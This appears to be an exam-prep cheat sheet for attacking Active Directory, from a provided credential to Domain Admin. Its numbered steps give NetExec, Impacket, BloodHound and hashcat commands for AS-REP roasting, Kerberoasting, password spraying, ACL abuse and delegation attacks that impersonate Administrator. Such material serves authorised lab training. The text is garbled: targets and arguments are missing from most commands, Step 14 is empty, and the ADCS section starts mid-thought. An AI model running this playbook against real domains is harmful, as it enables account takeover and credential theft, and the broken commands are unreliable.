> Purpose: the whole AD exam set on one page — from the provided credential to Domain Admin — in the order you actually use it. ## Method summary
Objective Technique Section
Map the domain SMB/LDAP enumeration, SRV records 1-2
Find weak credentials AS-REP roast, Kerberoast, spraying 3
Find the path BloodHound 4
Move sideways ACL abuse, delegation, local admin 5-6
Escalate to DA ADCS, DCSync 7, 9
Reach each machine WinRM, SMB exec, RDP 8
Priority: Core / Conditional / Advanced. Status: Lab Tested = executed against an authorised lab target · Simulated = exercised with simulated output or fixtures · Syntax Checked = flags checked against the installed tool here · Environment Dependent = needs a specific tool, version or host configuration · Documented = standard technique, not run here. ## Assumptions and scope - The exam AD set provides a username and password — you start authenticated, not from a port scan. - All three machines in the set are in scope once you are working the set. - Clock skew breaks Kerberos. Sync before blaming a credential. - Metasploit modules are limited to one machine across the whole exam; assume AD work must be done with Impacket, NetExec and native tools. ## 1. Confirm the domain ### Step 01 — Identify the DC and the domain Priority: Core · Run on: Kali · Status: Syntax Checked ```bash nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985 nxc smb dig @ _ldap._tcp. SRV +short ``` Look for: hostname, domain (in the SMB banner and SRV answer), signing: required on a DC.
Decision: domain name confirmed → Step 02. Kerberos (88) closed → some attacks are unavailable; stick to NTLM/LDAP.
Next: Step 02.
Common mistake: scanning the whole /24 before reading the credential sheet. In the AD set the DC is usually the first host you are pointed at.
Evidence: the banner and the SRV answer. ### Step 02 — Make names resolve Priority: Core · Run on: Kali · Status: Syntax Checked ```bash echo " . " | sudo tee -a /etc/hosts getent hosts ``` Look for: getent returning the DC address.
Decision: resolution works → Kerberos tools can use hostnames. Not resolving → every getST/-k command will fail with confusing errors.
Next: Step 03.
Common mistake: adding only the short name. Kerberos service tickets use the FQDN.
Evidence: the /etc/hosts line. ### Step 02a — Unauthenticated AD sweep (no credentials) Priority: Conditional · Run on: Kali · Status: Documented ```bash enum4linux-ng -A ``` Look for: domain name, DC hostname, OS build, user and group lists, shares, and the password policy — all without a credential.
Decision: a user list appears → Step 08 (AS-REP) or Step 12 (username enumeration). Policy shown → respect the lockout threshold in Step 11. Access denied → the DC blocks null sessions; continue with a credential at Step 03.
Next: Step 08 or Step 12.
Common mistake: treating the output as a complete user list. It is limited by null-session policy — cross-check with kerbrute userenum (Step 12).
Evidence: the domain, policy, and user list it returned. ## 2. Enumerate with the provided credential ### Step 03 — One-pass domain sweep Priority: Core · Run on: Kali · Status: Syntax Checked ```bash nxc smb -u -p '' -d --users --groups --shares --loggedon-users --pass-pol ``` Look for: [+] auth success, the user list, group membership, active sessions, and lockout threshold.
Decision: (Pwn3d!) → local admin, jump to Step 22. Valid but unprivileged → Step 04.
Next: Step 04.
Common mistake: running --users before reading --pass-pol. Know the lockout count before you touch a password.
Evidence: the auth line (user@domain on host), user list, policy. ### Step 04 — Collect BloodHound data Priority: Core · Run on: Kali · Status: Syntax Checked ```bash nxc ldap -u -p '' -d --bloodhound -c All --dns-server ``` Look for: a .zip written to the current directory, one per collection.
Decision: collection succeeds → Step 13. LDAP denied → try bloodhound-python (Step 05).
Next: Step 13.
Common mistake: leaving --dns-server off an internal domain — collection resolves nothing and produces a thin graph.
Evidence: the zip file and the time it was collected. ### Step 05 — BloodHound from Python (fallback) Priority: Conditional · Run on: Kali · Status: Syntax Checked ```bash bloodhound-python -u -p '' -d -ns -c All ``` Look for: Compressing output into ...zip.
Decision: zip produced → Step 13. Errors about DNS → check Step 02.
Next: Step 13.
Common mistake: running it without -ns, which sends queries to your resolver instead of the DC.
Evidence: the zip. ### Step 06 — Raw LDAP query Priority: Conditional · Run on: Kali · Status: Syntax Checked ```bash ldapsearch -x -H ldap:// -D '@' -w '' -b 'DC=,DC=' '(objectClass=user)' sAMAccountName description # same query through NetExec (compact output) nxc ldap -u -p --query "(objectClass=user)" "sAMAccountName,description,memberOf" ``` Look for: accounts with description fields holding passwords (a classic lab shortcut), and service-looking names.
Decision: a password in a description → validate it immediately (Step 11 constraints apply).
Next: Step 12 if the password works.
Common mistake: forgetting to convert corp.local into DC=corp,DC=local in the base DN.
Evidence: the entry containing the credential. ### Step 07 — Read the password policy Priority: Core · Run on: Kali · Status: Syntax Checked ```bash nxc smb -u -p '' -d --pass-pol ``` Look for: Lockout threshold, Lockout duration, Minimum password length, Password history.
Decision: threshold 0 = no lockout (spray freely but quietly). Threshold 3-5 → spray at most one password across all users, then stop.
Next: Step 11.
Common mistake: interpreting a lockout duration of 30 minutes as "safe to retry". It is not — the counter resets on success only if configured that way.
Evidence: the policy table, quoted in the report if you spray. ## 3. Credential attacks ### Step 08 — AS-REP roasting Priority: Core · Run on: Kali · Status: Syntax Checked ```bash # with a credential impacket-GetNPUsers /:'' -dc-ip -request -outputfile # without any credential impacket-GetNPUsers / -dc-ip -usersfile -no-pass -format hashcat -outputfile ``` Look for: $krb5asrep$23$... hashes written to the file.
Decision: hashes found → Step 10. Empty → no account has pre-authentication disabled; normal.
Next: Step 10.
Common mistake: using -request with -no-pass and no user list — the tool has nobody to ask about.
Evidence: the hash file (redact the hash in the report, keep the account name). ### Step 09 — Kerberoasting Priority: Core · Run on: Kali · Status: Syntax Checked ```bash impacket-GetUserSPNs /:'' -dc-ip -request -outputfile ``` Look for: service accounts with SPNs and $krb5tgs$23$... hashes.
Decision: a service account with an SPN and a weak password is the classic path. Hash obtained → Step 10.
Next: Step 10.
Common mistake: roasting an account that is already Domain Admin, cracking it, and then not checking whether its password works elsewhere.
Evidence: the SPN list and the hash file. ### Step 10 — Crack offline Priority: Core · Run on: Kali · Status: Syntax Checked ```bash hashcat -m 18200 # AS-REP hashcat -m 13100 # Kerberoast (RC4) hashcat -m 19700 # Kerberoast (AES) hashcat -m 18200 --show ``` Look for: ...:password on the --show line.
Decision: cracked → validate on SMB/WinRM (Step 11 order). Not cracked → move to ACL pathfinding (Step 13); do not burn an hour on a wordlist.
Next: Step 11 or Step 13.
Common mistake: using mode 13100 on an AES ticket — it will never crack. Check the hash prefix.
Evidence: the recovered password and which account it belongs to. ### Step 11 — Spray with the policy in mind Priority: Conditional · Run on: Kali · Status: Syntax Checked ```bash nxc smb -u -p '' -d --continue-on-success ``` Look for: [+] lines with (Pwn3d!) or plain success.
Decision: stop at the lockout threshold minus one. One password across many users is a spray; many passwords against one user is an attack that locks the account.
Next: re-enumerate with any new identity (Step 03).
Common mistake: spraying a password derived from the season/year without checking complexity policy first.
Evidence: which users succeeded, and the policy that made it safe. ### Step 12 — Username enumeration without credentials Priority: Conditional · Run on: Kali · Status: Documented ```bash kerbrute userenum -d --dc ``` Look for: VALID USERNAME lines.
Decision: valid names → Step 08 (-no-pass) and Step 11.
Next: Step 08.
Common mistake: a huge wordlist against Kerberos triggers alerts and takes hours; use a targeted list built from the domain naming convention.
Evidence: the valid-name list. ## 4. Read BloodHound ### Step 13 — Load and query Priority: Core · Run on: Kali · Status: Documented 1. sudo neo4j start, then open BloodHound and log in. 2. Upload the zip from Step 04/05 (drag into the UI). 3. Mark your owned users/computers as Owned. 4. Run the built-in queries, in this order: - Shortest Paths to Domain Admins from Owned Principals - Find Principals with DCSync Rights - List all Kerberoastable Accounts - Find AS-REP Roastable Users - Find Computers with Unconstrained Delegation - Shortest Paths to Unconstrained Delegation Systems Look for: a path of 2-4 edges ending at a group or a machine you can reach. The shortest path is usually the intended one.
Decision: edge is an ACL → Step 14. Delegation → Step 16-18. ADCS → Step 19.
Next: the section the edge points to.
Common mistake: staring at the graph instead of the query list. The prebuilt queries answer most exam questions in one click.
Evidence: a screenshot of the path, with the edge labels visible. ## 5. ACL abuse ### Step 14 — Match the edge to the tool

### Step 15 — Execute the ACL abuse Priority: Core · Run on: Kali · Status: Syntax Checked ```bash # ForceChangePassword / GenericAll on a user net rpc password '' '' -U '/%' -S # AddMember net rpc group addmem '' '' -U '/%' -S # WriteDACL -> give yourself FullControl impacket-dacledit -action write -rights FullControl -principal -target -dc-ip '/:' # WriteOwner impacket-owneredit -action write -new-owner -target -dc-ip '/:' ``` Look for: password changed, DACL modified, or a group membership confirmation.
Decision: password reset → authenticate as the target and re-run Step 03. DACL written → repeat the abuse you just granted yourself.
Next: Step 03 with the new identity.
Common mistake: changing a password on an account that is already in use by a service — you break the box and lose points. Prefer targeted Kerberoast where possible.
Evidence: the command and its confirmation, plus the new access it produced. > bloodyAD is the cleanest tool for targeted Kerberoast (set object servicePrincipalName -v 'http/fake'), but it is not installed here. Install with pipx install bloodyAD before relying on it. ## 6. Delegation ### Step 16 — Unconstrained delegation Priority: Advanced · Run on: Kali · Status: Documented ```bash nxc ldap -u -p '' -d --query "(userAccountControl:1.2.840.113556.1.4.803:=524288)" "sAMAccountName" ``` Look for: computer accounts trusted for delegation (often the DC itself — that is expected).
Decision: a non-DC host with unconstrained delegation → coerce an admin to authenticate to it (PrinterBug / PetitPotam / Coercer), capture the ticket, then pass-the-ticket.
Next: coercion tooling of your choice; validate it exists on your Kali build first.
Common mistake: coercing the DC into itself — the resulting ticket is useless for escalation.
Evidence: the delegation flag, the coercion command, and the captured ticket. ### Step 17 — Constrained delegation Priority: Advanced · Run on: Kali · Status: Syntax Checked ```bash impacket-getST -spn / -impersonate Administrator -dc-ip '/:' export KRB5CCNAME=.ccache ``` Look for: a .ccache written for the impersonated user.
Decision: ticket obtained → use -k -no-pass with Impacket against the allowed SPN only.
Next: use the ticket (Step 21).
Common mistake: requesting an SPN the account is not allowed to delegate to — the KDC refuses, and the error does not say why.
Evidence: msDS-AllowedToDelegateTo and the ticket request. ### Step 18 — Resource-based constrained delegation (RBCD) Priority: Advanced · Run on: Kali · Status: Syntax Checked ```bash impacket-addcomputer -computer-name 'FAKE$' -computer-pass '' -dc-ip '/:' impacket-rbcd -delegate-from 'FAKE$' -delegate-to '' -action write -dc-ip '/:' impacket-getST -spn cifs/ -impersonate Administrator -dc-ip '/FAKE$:' ``` Look for: the RBCD write succeeding, then a service ticket for Administrator.
Decision: addcomputer denied (MachineAccountQuota = 0) → RBCD needs an existing computer account you control.
Next: Step 21 with the ticket.
Common mistake: forgetting the trailing $ on computer names — they are machine accounts, not users.
Evidence: the RBCD attribute before/after, and the ticket. ## 7. It is not installed on the build host used for this audit, and its flags changed between v4 and v5: run certipy -h on your install before trusting the line above. Look for: ESC1 (enrollee supplies subject), ESC8 (HTTP enrollment + relay), ESC4 (writable template).
Decision: a vulnerable template you can enrol in → Step 20. ESC8 → relay to the CA (Advanced, needs coercion).
Next: Step 20.
Common mistake: certipy is not installed on this machine — pipx install certipy-ad first, and expect version-dependent flags.
